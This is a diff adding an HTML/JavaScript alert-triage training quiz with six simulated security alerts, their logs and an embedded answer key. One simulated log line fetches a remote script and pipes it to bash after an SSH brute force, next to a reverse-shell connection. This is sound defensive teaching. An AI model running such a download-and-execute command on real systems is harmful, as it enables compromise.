@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CPIA Module D - False Positive or Real Threat?</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;500;600;700&display=swap');
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  :root {
+    --bg: #0a0e17; --surface: #131825; --surface-hover: #1a2035;
+    --border: #1e2a42; --accent: #00d4aa; --accent-dim: #00d4aa22;
+    --danger: #ff4757; --danger-dim: #ff475722; --warning: #ffa502;
+    --text: #e2e8f0; --text-dim: #64748b; --correct: #00d4aa; --incorrect: #ff4757;
+  }
+  body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; padding: 2rem; }
+  .container { max-width: 850px; margin: 0 auto; }
+  .header { text-align: center; margin-bottom: 2rem; padding-bottom: 1.5rem; border-bottom: 1px solid var(--border); }
+  .header h1 { font-family: 'JetBrains Mono', monospace; font-size: 1.5rem; color: var(--accent); margin-bottom: 0.5rem; }
+  .header p { color: var(--text-dim); font-size: 0.9rem; }
+
+  .progress { display: flex; align-items: center; justify-content: space-between; margin-bottom: 1.5rem; }
+  .progress .counter { font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; color: var(--text-dim); }
+  .progress .score-bar { display: flex; gap: 0.4rem; }
+  .score-pip { width: 20px; height: 6px; border-radius: 3px; background: var(--border); }
+  .score-pip.correct { background: var(--correct); }
+  .score-pip.incorrect { background: var(--incorrect); }
+
+  .alert-card {
+    background: var(--surface); border: 1px solid var(--border); border-radius: 8px;
+    padding: 1.5rem; margin-bottom: 1.5rem;
+  }
+  .alert-header { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1rem; }
+  .alert-icon {
+    font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; font-weight: 700;
+    padding: 0.3rem 0.6rem; border-radius: 4px;
+  }
+  .alert-icon.high { background: var(--danger-dim); color: var(--danger); }
+  .alert-icon.medium { background: rgba(255,165,2,0.15); color: var(--warning); }
+  .alert-icon.low { background: var(--accent-dim); color: var(--accent); }
+  .alert-title { font-weight: 600; font-size: 1rem; }
+
+  .alert-details { margin-bottom: 1rem; }
+  .detail-row { display: flex; gap: 1rem; margin-bottom: 0.5rem; font-size: 0.85rem; }
+  .detail-label { font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: var(--accent); min-width: 100px; flex-shrink: 0; }
+  .detail-value { color: var(--text-dim); }
+
+  .log-evidence {
+    background: #080c14; border: 1px solid var(--border); border-radius: 6px;
+    padding: 1rem; margin-bottom: 1.5rem; font-family: 'JetBrains Mono', monospace;
+    font-size: 0.72rem; line-height: 1.7; color: #8892b0; overflow-x: auto;
+  }
+  .log-evidence .log-label {
+    font-size: 0.65rem; color: var(--accent); display: inline-block;
+    background: var(--accent-dim); padding: 0.1rem 0.4rem; border-radius: 2px; margin-bottom: 0.3rem;
+  }
+
+  .decision-btns { display: flex; gap: 1rem; margin-bottom: 1rem; }
+  .decision-btn {
+    flex: 1; padding: 1.25rem; border-radius: 8px; border: 2px solid var(--border);
+    background: var(--surface); cursor: pointer; transition: all 0.2s; text-align: center;
+  }
+  .decision-btn:hover:not(.disabled) { border-color: var(--accent); background: var(--surface-hover); }
+  .decision-btn .icon { font-size: 1.5rem; margin-bottom: 0.4rem; }
+  .decision-btn .label { font-weight: 600; font-size: 0.9rem; margin-bottom: 0.2rem; }
+  .decision-btn .sublabel { font-size: 0.75rem; color: var(--text-dim); }
+  .decision-btn.selected-fp { border-color: var(--warning); background: rgba(255,165,2,0.08); }
+  .decision-btn.selected-real { border-color: var(--danger); background: rgba(255,71,87,0.08); }
+  .decision-btn.disabled { cursor: default; opacity: 0.5; }
+  .decision-btn.disabled.correct-choice { opacity: 1; border-color: var(--correct); background: rgba(0,212,170,0.1); }
+  .decision-btn.disabled.wrong-choice { opacity: 1; border-color: var(--incorrect); background: rgba(255,71,87,0.1); }
+
+  .reasoning { margin-bottom: 1rem; }
+  .reasoning textarea {
+    width: 100%; background: var(--bg); border: 1px solid var(--border); border-radius: 6px;
+    padding: 0.75rem 1rem; color: var(--text); font-family: 'Inter', sans-serif;
+    font-size: 0.85rem; resize: vertical; min-height: 60px;
+  }
+  .reasoning textarea:focus { outline: none; border-color: var(--accent); }
+  .reasoning label { display: block; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: var(--accent); margin-bottom: 0.4rem; }
+
+  .explanation-box {
+    padding: 1rem 1.25rem; border-radius: 8px; font-size: 0.85rem; line-height: 1.6;
+    margin-bottom: 1rem; display: none;
+  }
+  .explanation-box.show { display: block; }
+  .explanation-box.correct-ex { background: rgba(0,212,170,0.1); border: 1px solid var(--correct); }
+  .explanation-box.incorrect-ex { background: rgba(255,71,87,0.1); border: 1px solid var(--incorrect); }
+  .explanation-box strong { color: var(--text); }
+  .explanation-box .verdict { font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; font-weight: 700; margin-bottom: 0.5rem; }
+
+  .btn { font-family: 'Inter', sans-serif; font-weight: 600; font-size: 0.9rem; padding: 0.75rem 1.5rem; border: none; border-radius: 6px; cursor: pointer; transition: all 0.2s; }
+  .btn-primary { background: var(--accent); color: var(--bg); }
+  .btn-primary:hover { opacity: 0.9; }
+  .btn-primary:disabled { opacity: 0.4; cursor: default; }
+  .btn-secondary { background: var(--surface); color: var(--text); border: 1px solid var(--border); }
+  .btn-secondary:hover { background: var(--surface-hover); }
+  .actions { display: flex; gap: 1rem; justify-content: center; margin-top: 1rem; }
+
+  .results-screen { text-align: center; padding: 3rem 1rem; }
+  .results-screen h2 { font-family: 'JetBrains Mono', monospace; font-size: 1.5rem; margin-bottom: 1rem; }
+  .results-screen .big-score { font-family: 'JetBrains Mono', monospace; font-size: 4rem; font-weight: 700; margin: 1rem 0; }
+  .results-screen .big-score.good { color: var(--correct); }
+  .results-screen .big-score.mid { color: var(--warning); }
+  .results-screen .big-score.bad { color: var(--incorrect); }
+  .results-screen p { color: var(--text-dim); margin-bottom: 0.5rem; }
+
+  .review-item { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 1rem 1.25rem; margin-bottom: 0.75rem; text-align: left; }
+  .review-item .ri-title { font-weight: 600; font-size: 0.9rem; margin-bottom: 0.25rem; }
+  .review-item .ri-verdict { font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; margin-bottom: 0.25rem; }
+  .review-item .ri-result { font-size: 0.8rem; }
+  .review-item .ri-result.pass { color: var(--correct); }
+  .review-item .ri-result.fail { color: var(--incorrect); }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <h1>CPIA // False Positive or Real Threat?</h1>
+    <p>D13 - Analyse alerts and supporting evidence to make the call</p>
+  </div>
+  <div id="app"></div>
+</div>
+<script>
+const scenarios = [
+  {
+    title: "Port Scan Detected",
+    severity: "high",
+    alert: "IDS Alert: Possible port scan from internal host",
+    details: [
+      { label: "Source", value: "10.0.1.200" },
+      { label: "Targets", value: "10.0.1.1-254 (full subnet)" },
+      { label: "Ports", value: "22, 80, 443, 445, 3389 (common service ports)" },
+      { label: "Time", value: "Sunday 02:00 AM" },
+      { label: "Duration", value: "12 minutes" },
+    ],
+    evidence: `<div class="log-label">IDS LOG</div>
+02:00:01 [ALERT] ET SCAN Possible Nmap -sS scan 10.0.1.200 -> 10.0.1.0/24
+02:00:01 Multiple SYN packets, no completed handshakes
+
+<div class="log-label">ASSET INVENTORY</div>
+10.0.1.200 = VULN-SCANNER-01 (Qualys Virtual Scanner Appliance)
+Owner: IT Security Team
+Purpose: Scheduled vulnerability scanning
+
+<div class="log-label">CHANGE MANAGEMENT</div>
+CHG-2026-0441: Weekly vulnerability scan - Sunday 02:00
+Approved by: CISO
+Scanner IP: 10.0.1.200`,
+    isFalsePositive: true,
+    explanation: "This is a <strong>false positive</strong>. The source IP (10.0.1.200) is the organisation's authorised vulnerability scanner running its approved weekly scan as documented in change management (CHG-2026-0441). The timing (Sunday 02:00) matches the approved schedule. The IDS correctly identified scanning behaviour but the activity is legitimate. <strong>Action:</strong> Whitelist the scanner IP in IDS rules during the approved scan window to reduce alert fatigue."
+  },
+  {
+    title: "Outbound Connection to Known-Bad IP",
+    severity: "high",
+    alert: "Threat Intel Match: Connection to IP on blocklist",
+    details: [
+      { label: "Source", value: "10.0.2.55 (WKSTN-MGARCIA)" },
+      { label: "Destination", value: "198.51.100.77:443" },
+      { label: "Threat Feed", value: "Listed on 3 threat feeds as Cobalt Strike C2" },
+      { label: "Time", value: "Tuesday 14:22" },
+      { label: "Frequency", value: "Every 62-68 seconds for 45+ minutes" },
+    ],
+    evidence: `<div class="log-label">FIREWALL LOG</div>
+14:22:03 ALLOW TCP 10.0.2.55:49221 -> 198.51.100.77:443
+14:23:05 ALLOW TCP 10.0.2.55:49222 -> 198.51.100.77:443
+14:24:08 ALLOW TCP 10.0.2.55:49223 -> 198.51.100.77:443
+[pattern continues every ~63 seconds]
+
+<div class="log-label">PROXY LOG</div>
+No proxy log entries - traffic bypassing proxy (direct HTTPS)
+
+<div class="log-label">DNS LOG</div>
+14:21:58 10.0.2.55 A query: cdn-analytics-tracker.com -> 198.51.100.77
+Domain registered 6 days ago. Registrar: NameCheap.
+
+<div class="log-label">ENDPOINT (EDR)</div>
+14:21:55 WKSTN-MGARCIA: rundll32.exe spawned by OUTLOOK.EXE
+Parent chain: outlook.exe -> cmd.exe -> rundll32.exe
+Loaded DLL: C:\\Users\\mgarcia\\AppData\\Local\\Temp\\report.dll`,
+    isFalsePositive: false,
+    explanation: "This is a <strong>real threat - active Cobalt Strike C2 beaconing</strong>. Multiple indicators confirm: the destination IP is on 3 threat feeds as Cobalt Strike infrastructure, the beaconing interval (62-68 seconds with jitter) is classic Cobalt Strike default, the domain was registered 6 days ago (freshly stood up infrastructure), traffic bypasses the proxy (direct HTTPS), and the endpoint shows a suspicious execution chain (Outlook spawning cmd.exe spawning rundll32.exe loading a temp DLL). <strong>Action:</strong> Isolate the host immediately, preserve memory and disk for forensics, block the C2 IP/domain at the firewall, and begin incident response."
+  },
+  {
+    title: "Large Data Transfer to Cloud Storage",
+    severity: "medium",
+    alert: "DLP Alert: Unusual upload volume to external service",
+    details: [
+      { label: "Source", value: "10.0.3.22 (WKSTN-JTHOMAS)" },
+      { label: "Destination", value: "storage.googleapis.com" },
+      { label: "Volume", value: "2.4 GB uploaded in 18 minutes" },
+      { label: "Time", value: "Friday 16:45" },
+      { label: "User", value: "j.thomas (Marketing Department)" },
+    ],
+    evidence: `<div class="log-label">PROXY LOG</div>
+16:45:02 j.thomas POST https://storage.googleapis.com/upload/storage/v1/b/mktg-assets-2026/o 
+16:45-17:03 Multiple PUT requests, total 2.4GB uploaded
+User-Agent: Google Chrome/126.0
+
+<div class="log-label">GOOGLE WORKSPACE ADMIN</div>
+j.thomas Google Drive activity:
+- Shared folder: "Q3 Campaign Assets" 
+- Contains: video files, PSD files, brand assets
+- Shared with: external agency creative@brandpartner.com (authorised vendor)
+
+<div class="log-label">HR SYSTEM</div>
+j.thomas: Active employee, Marketing Manager
+No resignation notice, no disciplinary flags
+Last performance review: "Exceeds expectations"
+
+<div class="log-label">HELPDESK TICKETS</div>
+TKT-8821 (Friday 16:30): j.thomas - "Need to share campaign 
+video files with agency before weekend deadline, files too 
+large for email"`,
+    isFalsePositive: true,
+    explanation: "This is a <strong>false positive</strong>. While 2.4GB is a large upload, the context explains it: the user raised a helpdesk ticket 15 minutes before the upload explaining the business need, the destination is an authorised Google Cloud Storage bucket for marketing assets, the files are campaign videos/creative assets (legitimately large), and the external recipient is a known vendor. The user has no risk indicators (active employee, good reviews, no resignation). <strong>Action:</strong> Close the alert, consider adjusting the DLP threshold for the marketing team's known workflows."
+  },
+  {
+    title: "Brute Force SSH Detected",
+    severity: "high",
+    alert: "IDS Alert: SSH brute force against production server",
+    details: [
+      { label: "Source", value: "203.0.113.45 (External, Romania)" },
+      { label: "Target", value: "10.0.4.10:22 (PROD-DB-01)" },
+      { label: "Attempts", value: "2,847 failed logins in 8 minutes" },
+      { label: "Time", value: "Wednesday 03:14 AM" },
+      { label: "Accounts Tried", value: "root, admin, postgres, ubuntu, deploy, backup" },
+    ],
+    evidence: `<div class="log-label">AUTH LOG (PROD-DB-01)</div>
+03:14:02 sshd: Failed password for root from 203.0.113.45
+03:14:02 sshd: Failed password for root from 203.0.113.45
+03:14:03 sshd: Failed password for admin from 203.0.113.45
+[2,844 more entries over 8 minutes]
+03:22:18 sshd: Accepted password for backup from 203.0.113.45
+
+<div class="log-label">FIREWALL LOG</div>
+PROD-DB-01 (10.0.4.10) port 22 is exposed to internet
+Rule: "Legacy SSH access" - Created 2023, no recent review
+
+<div class="log-label">NETWORK LOG</div>
+03:22:22 New outbound connection: 10.0.4.10 -> 185.220.101.33:4444
+Protocol: TCP, sustained connection
+
+<div class="log-label">PROCESS LOG</div>
+03:22:20 PROD-DB-01: /bin/bash spawned by sshd (user: backup)
+03:22:21 wget http://185.220.101.33/x86_64.sh | bash`,
+    isFalsePositive: false,
+    explanation: "This is a <strong>real threat - successful brute force leading to compromise</strong>. The attack is confirmed: 2,847 failed attempts followed by a successful login as 'backup' at 03:22:18. Post-compromise activity is immediate: a reverse shell connection to 185.220.101.33:4444 and malicious script download via wget. The root cause is SSH exposed to the internet via an unreviewed legacy firewall rule. <strong>Action:</strong> Isolate the server, kill the reverse shell connection, block both external IPs, rotate all credentials on the server, close the SSH firewall rule, and conduct forensic analysis. This is a confirmed breach requiring incident response."
+  },
+  {
+    title: "DNS Tunnelling Detected",
+    severity: "medium",
+    alert: "Anomaly Detection: High-volume DNS TXT queries from single host",
+    details: [
+      { label: "Source", value: "10.0.1.99 (WKSTN-ALEE)" },
+      { label: "Destination", value: "Internal DNS Resolver (10.0.0.2)" },
+      { label: "Query Type", value: "TXT records" },
+      { label: "Volume", value: "340 queries in 30 minutes" },
+      { label: "Domain", value: "*.dnscheck.tools" },
+    ],
+    evidence: `<div class="log-label">DNS LOG</div>
+11:00:02 10.0.1.99 TXT _dmarc.example.com via dnscheck.tools
+11:00:15 10.0.1.99 TXT _spf.example.com via dnscheck.tools
+11:00:28 10.0.1.99 TXT _dkim._domainkey.example.com
+11:01:02 10.0.1.99 TXT _dmarc.clientdomain.co.uk via dnscheck.tools
+[pattern continues - different target domains each query]
+
+<div class="log-label">PROXY LOG</div>
+11:00:01 a.lee HTTPS https://dnscheck.tools/ 200
+Browsing session: DNS/email validation tool website
+
+<div class="log-label">ASSET/HR</div>
+a.lee: IT Infrastructure Team, Email Administrator
+Current project: Email security hardening (SPF/DKIM/DMARC rollout)
+
+<div class="log-label">JIRA TICKET</div>
+INFRA-2201: "Validate SPF, DKIM and DMARC records for all 
+company domains before enforcing p=reject"
+Assigned: a.lee, Due: this week`,
+    isFalsePositive: true,
+    explanation: "This is a <strong>false positive</strong>. The TXT queries are legitimate DNS record lookups for email authentication (SPF, DKIM, DMARC records) across company domains. The user (a.lee) is the email administrator actively working on an email security hardening project (JIRA ticket INFRA-2201). The queries go to 'dnscheck.tools', a legitimate DNS validation service they're using via the web browser (confirmed in proxy logs). The subdomains are standard DNS record prefixes (_dmarc, _spf, _dkim._domainkey), not high-entropy encoded data. <strong>Key difference from real DNS tunnelling:</strong> subdomains are human-readable standard prefixes, queries target different domains (not one C2 domain), and the activity correlates with a legitimate business task."
+  },
+  {
+    title: "Privilege Escalation Attempt",
+    severity: "high",
+    alert: "SIEM: Multiple Event ID 4672 from single account in short window",
+    details: [
+      { label: "Account", value: "svc_deploy" },
+      { label: "Source", value: "10.0.5.20 (BUILD-SERVER-01)" },
+      { label: "Events", value: "47x Event ID 4672 in 5 minutes" },
+      { label: "Time", value: "Thursday 11:30 AM" },
+      { label: "Context", value: "Service account for CI/CD pipeline" },
+    ],
+    evidence: `<div class="log-label">WINDOWS SECURITY LOG</div>
+11:30:01 Event 4624: svc_deploy logon, Type 3 (Network), from BUILD-SERVER-01
+11:30:01 Event 4672: Special privileges (SeAssignPrimaryTokenPrivilege, 
+  SeImpersonatePrivilege) assigned to svc_deploy
+[Pattern repeats 47 times in 5 minutes]
+
+<div class="log-label">CI/CD SYSTEM (JENKINS)</div>
+11:29:58 Pipeline "production-deploy-v2.4.1" triggered
+Job: Deploy 47 microservices to production cluster
+Each service deployment authenticates as svc_deploy
+Pipeline status: SUCCESS
+
+<div class="log-label">CHANGE MANAGEMENT</div>
+CHG-2026-0892: Production release v2.4.1
+Approved: Wednesday 16:00 by Release Manager
+Scheduled: Thursday 11:30
+
+<div class="log-label">SERVICE ACCOUNT AUDIT</div>
+svc_deploy: Created 2024, purpose: CI/CD deployments
+Privileges: SeAssignPrimaryTokenPrivilege, SeImpersonatePrivilege
+Last password rotation: 14 days ago (policy: 30 days)
+MFA: N/A (service account, certificate-based auth)`,
+    isFalsePositive: true,
+    explanation: "This is a <strong>false positive</strong>. The 47 Event ID 4672 entries are generated by a CI/CD pipeline deploying 47 microservices, each requiring a separate authentication as svc_deploy with its assigned privileges. The deployment was approved via change management (CHG-2026-0892), matches the scheduled time, and the Jenkins pipeline completed successfully. The privileges (SeAssignPrimaryTokenPrivilege, SeImpersonatePrivilege) are expected for a deployment service account. <strong>Action:</strong> Tune the SIEM correlation rule to account for known service account activity patterns during approved change windows."
+  }
+];
+
+let currentIdx = 0;
+let answers = [];
+let decision = null;
+
+function shuffle(arr) {
+  const a = [...arr];
+  for (let i = a.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [a[i], a[j]] = [a[j], a[i]];
+  }
+  return a;
+}
+
+let order = [];
+
+function startGame() {
+  currentIdx = 0;
+  answers = [];
+  decision = null;
+  order = shuffle(scenarios.map((_, i) => i));
+  renderScenario();
+}
+
+function renderScenario() {
+  const s = scenarios[order[currentIdx]];
+  const answered = answers.length > currentIdx;
+
+  document.getElementById('app').innerHTML = `
+    <div class="progress">
+      <div class="counter">Alert ${currentIdx + 1} of ${scenarios.length}</div>
+      <div class="score-bar">
+        ${answers.map((a, i) => `<div class="score-pip ${a ? 'correct' : 'incorrect'}"></div>`).join('')}
+        ${Array(scenarios.length - answers.length).fill('<div class="score-pip"></div>').join('')}
+      </div>
+    </div>
+
+    <div class="alert-card">
+      <div class="alert-header">
+        <div class="alert-icon ${s.severity}">${s.severity.toUpperCase()}</div>
+        <div class="alert-title">${s.alert}</div>
+      </div>
+      <div class="alert-details">
+        ${s.details.map(d => `
+          <div class="detail-row">
+            <div class="detail-label">${d.label}</div>
+            <div class="detail-value">${d.value}</div>
+          </div>
+        `).join('')}
+      </div>
+    </div>
+
+    <div class="log-evidence">${s.evidence}</div>
+
+    <div class="decision-btns">
+      <div class="decision-btn ${answered ? 'disabled' : ''} ${decision === 'fp' && !answered ? 'selected-fp' : ''} ${answered ? (s.isFalsePositive ? 'correct-choice' : (decision === 'fp' ? 'wrong-choice' : '')) : ''}" 
+           onclick="${answered ? '' : "selectDecision('fp')"}">
+        <div class="icon">&#9888;</div>
+        <div class="label">False Positive</div>
+        <div class="sublabel">Legitimate activity, close alert</div>
+      </div>
+      <div class="decision-btn ${answered ? 'disabled' : ''} ${decision === 'real' && !answered ? 'selected-real' : ''} ${answered ? (!s.isFalsePositive ? 'correct-choice' : (decision === 'real' ? 'wrong-choice' : '')) : ''}"
+           onclick="${answered ? '' : "selectDecision('real')"}">
+        <div class="icon">&#9760;</div>
+        <div class="label">Real Threat</div>
+        <div class="sublabel">Genuine attack, escalate</div>
+      </div>
+    </div>
+
+    ${!answered ? `
+      <div class="reasoning">
+        <label>// YOUR REASONING (optional)</label>
+        <textarea id="reasoning" placeholder="Why did you make this call? What evidence supports your decision?"></textarea>
+      </div>
+      <div class="actions">
+        <button class="btn btn-primary" onclick="submitDecision()" ${decision === null ? 'disabled' : ''}>Submit Decision</button>
+      </div>
+    ` : `
+      <div class="explanation-box show ${answers[currentIdx] ? 'correct-ex' : 'incorrect-ex'}">
+        <div class="verdict">${answers[currentIdx] ? 'CORRECT' : 'INCORRECT'}</div>
+        ${s.explanation}
+      </div>
+      <div class="actions">
+        ${currentIdx < scenarios.length - 1 ? 
+          `<button class="btn btn-primary" onclick="nextScenario()">Next Alert</button>` :
+          `<button class="btn btn-primary" onclick="showResults()">See Results</button>`
+        }
+      </div>
+    `}
+  `;
+}
+
+function selectDecision(d) {
+  decision = d;
+  renderScenario();
+}
+
+function submitDecision() {
+  if (decision === null) return;
+  const s = scenarios[order[currentIdx]];
+  const correct = (decision === 'fp' && s.isFalsePositive) || (decision === 'real' && !s.isFalsePositive);
+  answers.push(correct);
+  renderScenario();
+}
+
+function nextScenario() {
+  currentIdx++;
+  decision = null;
+  renderScenario();
+}
+
+function showResults() {
+  const correct = answers.filter(Boolean).length;
+  const total = answers.length;
+  const pct = Math.round((correct / total) * 100);
+  let cls = 'good';
+  if (pct < 50) cls = 'bad';
+  else if (pct < 80) cls = 'mid';
+
+  document.getElementById('app').innerHTML = `
+    <div class="results-screen">
+      <h2>Analysis Complete</h2>
+      <div class="big-score ${cls}">${correct}/${total}</div>
+      <p>${pct >= 80 ? 'Strong triage instincts. You correctly identified the key evidence.' : 
+          pct >= 50 ? 'Reasonable baseline but some alerts were miscategorised. Review the evidence you may have overlooked.' :
+          'Significant gaps in alert triage. Focus on correlating multiple evidence sources before making a call.'}</p>
+      <div style="margin: 2rem 0;">
+        ${order.map((si, i) => {
+          const s = scenarios[si];
+          return `<div class="review-item">
+            <div class="ri-title">${s.title}</div>
+            <div class="ri-verdict" style="color: ${s.isFalsePositive ? 'var(--warning)' : 'var(--danger)'}">
+              ${s.isFalsePositive ? 'FALSE POSITIVE' : 'REAL THREAT'}
+            </div>
+            <div class="ri-result ${answers[i] ? 'pass' : 'fail'}">
+              ${answers[i] ? 'You got this right' : 'You got this wrong'}
+            </div>
+          </div>`;
+        }).join('')}
+      </div>
+      <div class="actions">
+        <button class="btn btn-primary" onclick="startGame()">Try Again (Reshuffled)</button>
+      </div>
+    </div>
+  `;
+}
+
+startGame();
+</script>
+</body>
+</html>
